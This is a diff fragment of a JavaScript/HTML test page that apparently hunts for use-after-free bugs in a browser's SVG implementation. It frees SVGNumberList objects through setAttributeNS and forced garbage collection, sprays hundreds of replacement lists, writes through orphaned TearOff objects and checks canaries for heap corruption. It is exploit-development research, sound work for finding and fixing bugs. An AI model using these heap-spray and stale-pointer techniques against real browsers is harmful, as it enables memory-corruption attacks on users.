-  T_bv73=null;list73=null;
+  // PART B: 500 allocs after freeing 500 → free-list populated (if it exists)
+  var t0b=performance.now();
+  var afterFreeAllocs=[];
+  for(var i=0;i<500;i++) afterFreeAllocs.push(makeList('ab79_'+i,(i+1)*88));
+  var t1b=performance.now();
+  var timeAfterFree=t1b-t0b;
+  L('ADR79-B: 500 allocs after freeing 500: time='+timeAfterFree.toFixed(1)+'ms','info');
+  L('ADR79: timing ratio afterFree/baseline='+((timeAfterFree/timeBaseline)*100).toFixed(1)+'%','info');
 
-  // Force GC
+  if(timeAfterFree < timeBaseline*0.7){
+    L('★★★ ADR79: afterFree MUCH FASTER → IsoHeap has free-list (slots reused, no bump)','hit');
+  } else if(timeAfterFree < timeBaseline*0.9){
+    L('ADR79: afterFree slightly faster → possible free-list usage','warn');
+  } else {
+    L('ADR79: similar times → bump-only IsoHeap (no free-list, each alloc bumps)','info');
+  }
+
+  // PART C: write-on-freed-slot confirmation
+  // Create list, record canary, trigger free via setAttributeNS,
+  // then create 100 new lists and check their initial values via IIFE trick
+  L('ADR79-C: write-on-freed-slot — checking if new lists inherit old data','info');
+
+  // Create 20 victim lists with very distinctive canaries
+  var victims79=[];
+  for(var i=0;i<20;i++){
+    victims79.push(makeList('vc79_'+i,(i+1)*99999));
+  }
+  L('ADR79-C: 20 victim lists with canaries 99999..1999980','info');
+
+  // Free them via setAttributeNS + GC
+  var orphans79=[];
+  victims79.forEach(function(s,i){
+    var T=s.fe.values.baseVal.getItem(0);
+    orphans79.push(T);
+    var nv=[];for(var k=0;k<20;k++)nv.push(k===0?0:0);
+    s.fe.setAttributeNS(null,'values',nv.join(' '));
+    // release list ref
+    s.list=null;
+  });
+
+  gcFull();gcFull();gcFull();
+
+  // Now alloc 100 new lists → might land at freed victim slots
+  var probes79=[];
+  for(var i=0;i<100;i++){
+    var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);
+    var fe=document.createElementNS(SVG_NS,'feColorMatrix');
+    fe.setAttribute('type','matrix');
+    // DO NOT set values via attribute — use appendItem to get "raw" initial value
+    // (though SVGNumber default constructor sets m_value=0)
+    // Actually we have to set values to make it a valid 20-element list...
+    var vz=[];for(var k=0;k<20;k++)vz.push(0);
+    fe.setAttribute('values',vz.join(' '));
+    s.appendChild(fe);
+    // Read value BEFORE setting canary
+    var rawInit=fe.values.baseVal.getItem(0).value;
+    // Now set canary to mark it
+    fe.values.baseVal.getItem(0).value=((i+1)*1111);
+    probes79.push({svg:s,fe:fe,raw:rawInit,canary:(i+1)*1111});
+  }
+
+  // Check raw init values — any match victim canaries?
+  var hits79=probes79.filter(function(p){
+    return victims79.some(function(v){return Math.abs(p.raw-(v.canary))<=0.5;});
+  });
+  var nonZeroRaw=probes79.filter(function(p){return Math.abs(p.raw)>0.1;});
+
+  L('ADR79-C: probes with non-zero raw init value: '+nonZeroRaw.length+'/100','info');
+  if(nonZeroRaw.length>0){
+    L('★★★ ADR79-C: non-zero raw init → IsoHeap did NOT zero freed slot before reuse!','hit');
+    nonZeroRaw.slice(0,5).forEach(function(p){
+      L('  probe raw='+p.raw.toFixed(3)+' bits='+f32hex(p.raw),'warn');
+    });
+  }
+  if(hits79.length>0){
+    L('★★★ ADR79-C: '+hits79.length+' probes read OLD VICTIM CANARY VALUES → free-list reuse confirmed!','hit');
+  } else {
+    L('ADR79-C: all probes init=0 (IsoHeap zeros freed slots or bump-only)','info');
+  }
+
+  // PART D: the ADR68/ADR73 combo test — spray SVGNumberLists to land at freed list_A,
+  // then trigger notification write, check for any probe reading unexpected value
+  // This is the most direct test of "write primitive into controlled SVGNumberList"
+  L('ADR79-D: direct combo — free list_A, spray 200 SVGNumberLists, write to orphaned TearOff','info');
+
+  var combo=makeList('cm79',12345);
+  var T_combo=combo.fe.values.baseVal.getItem(0);
+  // register for GC confirmation
+  var comboListFreed=false;
+  var regD=new FinalizationRegistry(function(t){
+    if(t==='combo_list') comboListFreed=true;
+    L('ADR79-D: FinalizationRegistry fired: '+t,'warn');
+  });
+  if(combo.list) regD.register(combo.list,'combo_list');
+  combo.list=null;
+
+  // setAttributeNS → free list_A
+  var nvcm=[];for(var i=0;i<20;i++)nvcm.push(0);
+  combo.fe.setAttributeNS(null,'values',nvcm.join(' '));
+  L('ADR79-D: setAttributeNS done','info');
+
+  // GC to confirm list freed
   gcFull();
 
   setTimeout(function(){
-    L('ADR73: after gcFull + 300ms:','info');
-    L('ADR73: tearoffGCd='+tearoffGCd73,'info');
-    L('ADR73: listGCd='+listGCd73,'info');
+    L('ADR79-D: combo list freed? '+comboListFreed,'info');
 
-    if(tearoffGCd73){
-      L('★★★ ADR73: baseVal TearOff WAS GC\'d → C++ TearOff destructor ran → RefPtr<SVGNumber> decremented','hit');
-      L('ADR73: if nobody else holds that SVGNumber → it was freed → UAF write possible via prior write in ADR68!','warn');
+    // Spray 200 new SVGNumberLists immediately
+    var spray_d=[];
+    for(var i=0;i<200;i++) spray_d.push(makeList('spd79_'+i,(i+1)*333));
+    L('ADR79-D: 200 SVGNumberLists sprayed (canaries 333..66600)','info');
+
+    // Write to orphaned TearOff → notification fires → writes to freed list_A / spray target
+    try{T_combo.value=77777;}catch(e){L('write threw: '+e.message,'miss');}
+    L('ADR79-D: wrote T_combo.value=77777','info');
+
+    // Check spray for corruption
+    var badD=[];
+    spray_d.forEach(function(s,i){
+      var exp=(i+1)*333;
+      var got=s.item.value;
+      if(Math.abs(got-exp)>0.5) badD.push({i:i,exp:exp,got:got,bits:f32hex(got)});
+    });
+
+    if(badD.length>0){
+      L('★★★ ADR79-D: '+badD.length+' SPRAY LISTS CORRUPTED!','hit');
+      badD.forEach(function(x){L('  spray['+x.i+']: exp='+x.exp+' got='+x.got.toFixed(3)+' bits='+x.bits,'hit');});
     } else {
-      L('ADR73: baseVal TearOff NOT YET GC\'d (may need more GC pressure)','info');
+      L('ADR79-D: 0 corruptions (IsoHeap bump-only — freed slot not reused by spray)','info');
     }
 
-    if(listGCd73){
-      L('★★★ ADR73: baseVal LIST was GC\'d → SVGNumberList freed after setAttributeNS → list_A freed!','hit');
-      L('ADR73: notification chain from write-to-orphaned-TearOff fires on FREED list_A → UAF write target confirmed','warn');
-    } else {
-      L('ADR73: baseVal list NOT YET GC\'d (still held by fe73 or browser? or not registered correctly)','info');
-    }
-
-    // Extra GC pressure
-    gcFull();gcFull();gcFull();
-    setTimeout(function(){
-      L('ADR73: after extra 3x gcFull:','info');
-      L('ADR73: tearoffGCd='+tearoffGCd73,'info');
-      L('ADR73: listGCd='+listGCd73,'info');
-
-      // Does feColorMatrix still work? (its live list should be list_B)
-      var liveBv=fe73.values.baseVal.getItem(0).value;
-      L('ADR73: live fe73 bv[0]='+liveBv+' (should be 1234, list_B intact)','info');
-
-      svg73.remove();
-    },600);
-  },300);
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR74 — SVGTransformList path — completely different C++ types
-//
-// SVGElement.transform.animVal gives a live SVGTransformList (not SVGNumberList).
-// SVGTransform objects within it are different IsoHeap bins from SVGNumber.
-//
-// An animated transform element (animateTransform) creates per-frame
-// SVGTransform/SVGMatrix objects. Different code path, different refcounting.
-//
-// Test: animate a rect's transform, collect per-frame animVal TearOffs,
-// release them, watch for corruption.
-//
-// Also: SVGMatrix objects have 6 float fields (a,b,c,d,e,f) — more data
-// per object means more observable corruption if UAF occurs.
-//
-// Key difference from feColorMatrix: SVGTransform.matrix returns an SVGMatrix
-// which is a SEPARATE object from the SVGTransform. Two levels of C++ objects
-// that each need RefPtr protection.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR74']=function(){
-  L('ADR74: SVGTransformList — animateTransform frame-escape test','info');
-
-  var svg74=document.createElementNS(SVG_NS,'svg');
-  svg74.setAttribute('width','200');svg74.setAttribute('height','200');
-  document.body.appendChild(svg74);
-
-  var rect74=document.createElementNS(SVG_NS,'rect');
-  rect74.setAttribute('width','50');rect74.setAttribute('height','50');
-  rect74.setAttribute('transform','translate(0,0)');
-  svg74.appendChild(rect74);
-
-  // Animate the transform
-  var anim74=document.createElementNS(SVG_NS,'animateTransform');
-  anim74.setAttribute('attributeName','transform');
-  anim74.setAttribute('attributeType','XML');
-  anim74.setAttribute('type','translate');
-  anim74.setAttribute('from','0,0');
-  anim74.setAttribute('to','100,100');
-  anim74.setAttribute('dur','8s');
-  anim74.setAttribute('repeatCount','indefinite');
-  rect74.appendChild(anim74);
-  try{anim74.beginElement();}catch(e){}
-
-  setTimeout(function(){
-    // Check: does rect74.transform.animVal work?
-    try{
-      var avList=rect74.transform.animVal;
-      L('ADR74: rect74.transform.animVal type='+typeof avList,'info');
-      L('ADR74: animVal.numberOfItems='+avList.numberOfItems,'info');
-
-      if(avList.numberOfItems>0){
-        var T74=avList.getItem(0);
-        L('ADR74: T74.type='+T74.type+' (4=translate)','info');
-        var M74=T74.matrix;
-        L('ADR74: matrix e='+M74.e.toFixed(3)+' f='+M74.f.toFixed(3)+' (should be ~0..100)','info');
-
-        // Collect 20 per-frame SVGTransform TearOffs
-        var frame74=0;
-        var held74=[];
-
-        function collect74(){
-          var t=rect74.transform.animVal.getItem(0);
-          var m=t.matrix;
-          held74.push({t:t,e:m.e,f:m.f,frame:frame74});
-          frame74++;
-          if(frame74<20) requestAnimationFrame(collect74);
-          else afterCollect74();
-        }
-
-        function afterCollect74(){
-          L('ADR74: 20 SVGTransform TearOffs collected','info');
-          L('ADR74: frame[0].e='+held74[0].e.toFixed(3)+' frame[19].e='+held74[19].e.toFixed(3),'info');
-          L('ADR74: all different? '+(held74[0].t!==held74[19].t?'YES (per-frame new TearOff)':'NO (same object)'),'info');
-
-          // Alloc sentinel feColorMatrix blocks (still SVGNumber type, but just for comparison)
-          var sents74=[];
-          for(var i=0;i<50;i++){
-            var sv=document.createElementNS(SVG_NS,'svg');document.body.appendChild(sv);
-            var fe=document.createElementNS(SVG_NS,'feColorMatrix');
-            fe.setAttribute('type','matrix');
-            var v=[];for(var k=0;k<20;k++)v.push(k===0?(i+1)*1000:0);
-            fe.setAttribute('values',v.join(' '));
-            sv.appendChild(fe);
-            sents74.push({svg:sv,fe:fe,t:fe.values.baseVal.getItem(0),canary:(i+1)*1000});
-          }
-          L('ADR74: 50 SVGNumber sentinels allocated','info');
-
-          // Release all 20 SVGTransform TearOffs
-          (function(){
-            var refs=held74;
-            held74=null;
-            for(var i=0;i<refs.length;i++){refs[i].t=null;refs[i]=null;}
-          })();
-          gcFull();gcFull();
-          L('ADR74: released all 20 SVGTransform TearOffs + 2x gcFull','info');
-
-          // Check: get fresh TearOff, read matrix
-          var fresh74=rect74.transform.animVal.getItem(0);
-          var freshM=fresh74.matrix;
-          L('ADR74: fresh animVal after release: e='+freshM.e.toFixed(3)+' f='+freshM.f.toFixed(3),'info');
-
-          // Watch 5 frames
-          var fw74=0;
-          function watch74(){
-            fw74++;
-            var cur=rect74.transform.animVal.getItem(0).matrix.e;
-
-            // Check sentinels
-            var bad74=[];
-            sents74.forEach(function(s,i){
-              if(Math.abs(s.t.value-s.canary)>0.5) bad74.push({i:i,expected:s.canary,got:s.t.value});
-            });
-
-            if(bad74.length>0){
-              L('★★★ ADR74 frame+'+fw74+': '+bad74.length+' SVGNumber sentinels CORRUPTED','hit');
-              bad74.forEach(function(x){L('  S['+x.i+']: '+x.expected+' → '+x.got.toFixed(3),'hit');});
-            } else {
-              L('  frame+'+fw74+' SVGTransform e='+cur.toFixed(3)+' sentinels OK','info');
-            }
-
-            if(fw74<5) requestAnimationFrame(watch74);
-            else {
-              L('ADR74: test complete','info');
-              sents74.forEach(function(s){s.svg.remove();});
-              svg74.remove();
-            }
-          }
-          requestAnimationFrame(watch74);
-        }
-        requestAnimationFrame(collect74);
-      } else {
-        L('ADR74: animVal.numberOfItems=0 — no transform items during animation (SMIL animateTransform may work differently)','miss');
-        svg74.remove();
-      }
-    }catch(e){
-      L('ADR74 threw: '+(e.stack||e.message),'miss');
-      svg74.remove();
-    }
-  },200);
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR75 — SVGNumberList bin probe: sentinel TYPE matches freed object type
-//
-// Problem with v64-68: our sentinels are SVGNumber objects.
-// When setAttributeNS frees list_A (SVGNumberList), any UAF write goes
-// to the SVGNumberList IsoHeap bin — NOT the SVGNumber bin.
-// Different bins = no cross-contamination visible in SVGNumber sentinels.
-//
-// To detect UAF writes in the SVGNumberList bin, we need SVGNumberList
-// sentinels that can OBSERVE their memory being overwritten.
-//
-// Approach: create many feColorMatrix elements, grab their baseVal list
-// objects, track the FIRST item value in each list as a canary.
-// After setAttributeNS on ANOTHER element (freeing list_A):
-// - The freed list_A has known type: SVGNumberList
-// - Our sentinel lists are also SVGNumberList type → same IsoHeap bin
-// - If bump-only: probes go to new addresses → sentinels untouched
-// - If free-list: probe at list_A's freed slot → DIFFERENT object type
-//   (a new SVGNumberList would land there and its [0] value would be 0,
-//   while our canary is nonzero) — but this still wouldn't show corruption
-//
-// Better approach: USE THE SAME ELEMENT
-// 1. Create feColorMatrix, get baseVal TearOff T_bv (holds old list_A's SVGNumber)
-// 2. setAttributeNS → list_B created, list_A freed (maybe)
-// 3. IMMEDIATELY get baseVal of a DIFFERENT feColorMatrix element that was
-//    just freshly created — its list might land at list_A's freed slot
-// 4. Check: does the fresh list's [0] value = expected default (0)?
-//    If it shows garbage → it landed at freed list_A and inherited garbage
-//
-// Actually the cleanest test: observable UAF through the notification chain write.
-// The write path (ADR68) showed the notification chain fires but we don't know
-// what it writes to. We need to figure out WHAT ADDRESS the notification writes to.
-//
-// DIFFERENT APPROACH for ADR75:
-// Use multiple rapid setAttributeNS calls to create a "stale pointer race":
-// 1. Set up animation
-// 2. During SMIL animation: SMIL is reading/writing to list_B's SVGNumber
-// 3. Call setAttributeNS very rapidly (5x in same microtask) to cycle through list_C, D, E, F, G
-// 4. SMIL might still have a stale pointer to an intermediate list's SVGNumber
-// 5. Check animVal after rapid cycling — does it show garbage?
-//
-// This tests: SMIL's "current animated value" pointer race with rapid attribute cycling
-// ═══════════════════════════════════════════════════════════════
-suites['ADR75']=function(){
-  L('ADR75: SVGNumberList bin probe — rapid setAttr cycle during SMIL write','info');
-
-  var ctx75=makeLiveAnimFe('f75',8000,0,12);
-
-  setTimeout(function(){
-    // Part A: rapid setAttributeNS cycling (5 rapid changes)
-    L('ADR75-A: rapid setAttr cycling — 5 changes in one microtask','info');
-
-    var avBefore=ctx75.fe.values.animVal.getItem(0).value;
-    L('ADR75-A: animVal before rapid setAttr='+avBefore.toFixed(3),'info');
-
-    // RAPID 5x setAttributeNS (all in same synchronous block)
-    // SMIL might hold stale ptr to intermediate lists
-    var vals_c=[];for(var i=0;i<20;i++)vals_c.push(i===0?100:0);
-    ctx75.fe.setAttributeNS(null,'values',vals_c.join(' '));
-
-    var vals_d=[];for(var i=0;i<20;i++)vals_d.push(i===0?200:0);
-    ctx75.fe.setAttributeNS(null,'values',vals_d.join(' '));
-
-    var vals_e=[];for(var i=0;i<20;i++)vals_e.push(i===0?300:0);
-    ctx75.fe.setAttributeNS(null,'values',vals_e.join(' '));
-
-    var vals_f=[];for(var i=0;i<20;i++)vals_f.push(i===0?400:0);
-    ctx75.fe.setAttributeNS(null,'values',vals_f.join(' '));
-
-    var vals_g=[];for(var i=0;i<20;i++)vals_g.push(i===0?500:0);
-    ctx75.fe.setAttributeNS(null,'values',vals_g.join(' '));
-
-    L('ADR75-A: 5 rapid setAttributeNS done','info');
-
-    // Check animVal immediately after rapid cycling
-    var avAfterSync=ctx75.fe.values.animVal.getItem(0).value;
-    L('ADR75-A: animVal immediately after 5x setAttr='+avAfterSync.toFixed(3),'info');
-    L('ADR75-A: live bv[0]='+ctx75.fe.values.baseVal.getItem(0).value+' (should be 500)','info');
-
-    // Check for garbage/unexpected values
-    if(isNaN(avAfterSync)||!isFinite(avAfterSync)){
-      L('★★★ ADR75-A: animVal is NaN/Inf after rapid setAttr — pointer corruption!','hit');
-    } else if(avAfterSync<0||avAfterSync>100000){
-      L('★★★ ADR75-A: animVal='+avAfterSync.toFixed(3)+' is out of expected range — possible stale ptr read!','warn');
-    }
-
-    // Part B: watch animVal for several frames after rapid cycling
-    // SMIL should now animate from 500→0 (new base after last setAttr)
-    // OR from original 8000→0 (if SMIL cached from-value at animation start)
-    var fw75=0;
-    function watch75A(){
-      fw75++;
-      var av=ctx75.fe.values.animVal.getItem(0).value;
-      if(isNaN(av)||!isFinite(av)){
-        L('★★★ ADR75-B frame+'+fw75+': animVal='+av+' (NaN/Inf — pointer corruption after rapid setAttr!)','hit');
-      } else {
-        L('  frame+'+fw75+' animVal='+av.toFixed(3),'info');
-      }
-      if(fw75<5) requestAnimationFrame(watch75A);
-      else continuePart75B();
-    }
-    requestAnimationFrame(watch75A);
-
-    function continuePart75B(){
-      L('ADR75-C: rapid setAttr DURING animVal TearOff hold','info');
-
-      // Hold an animVal TearOff WHILE rapidly changing the attribute
-      var held75=ctx75.fe.values.animVal.getItem(0);
-      var heldVal=held75.value;
-      L('ADR75-C: held75.value before rapid setAttr='+heldVal.toFixed(3),'info');
-
-      // Rapid setAttributeNS while holding animVal TearOff
-      for(var r75=0;r75<10;r75++){
-        var v75=[];for(var k=0;k<20;k++)v75.push(k===0?(r75+1)*50:0);
-        ctx75.fe.setAttributeNS(null,'values',v75.join(' '));
-      }
-
-      L('ADR75-C: 10 rapid setAttributeNS while holding animVal TearOff','info');
-      L('ADR75-C: held75.value after 10x setAttr='+held75.value.toFixed(3),'info');
-
-      if(isNaN(held75.value)||!isFinite(held75.value)){
-        L('★★★ ADR75-C: held animVal TearOff reads garbage after rapid setAttr!','hit');
-      }
-
-      // Write to held animVal TearOff after rapid setAttr
-      L('ADR75-C: writing to held animVal TearOff after rapid setAttr','info');
-      try{
-        held75.value=55555; // this should throw (animVal is read-only)
-        L('ADR75-C: write to animVal did NOT throw (unexpected) — value='+held75.value,'warn');
-      }catch(e){
-        L('ADR75-C: write to animVal threw (expected — read-only): '+e.message,'info');
-      }
-
-      // Release held TearOff
-      held75=null;
-      gcFull();
-      L('ADR75-C: held TearOff released + gcFull','info');
-
-      // Part D: what does animVal read now after all the rapid cycling?
-      var av75Final=ctx75.fe.values.animVal.getItem(0).value;
-      L('ADR75-D: animVal after all tests='+av75Final.toFixed(3),'info');
-
-      // Watch 3 more frames
-      var fw75D=0;
-      function watch75D(){
-        fw75D++;
-        var av=ctx75.fe.values.animVal.getItem(0).value;
-        if(isNaN(av)||!isFinite(av)){
-          L('★★★ ADR75-D frame+'+fw75D+': NaN animVal — corruption!','hit');
-        } else {
-          L('  frame+'+fw75D+' animVal='+av.toFixed(3),'info');
-        }
-        if(fw75D<3) requestAnimationFrame(watch75D);
-        else {
-          L('ADR75: all parts complete','info');
-          ctx75.svg.remove();
-        }
-      }
-      requestAnimationFrame(watch75D);
-    }
+    // Cleanup
+    spray_d.forEach(function(s){s.svg.remove();});
+    combo.svg.remove();
+    afterFreeAllocs.forEach(function(s){s.svg.remove();});
+    probes79.forEach(function(p){p.svg.remove();});
+    victims79.forEach(function(v){v.svg.remove();});
   },300);
 };
 </script>
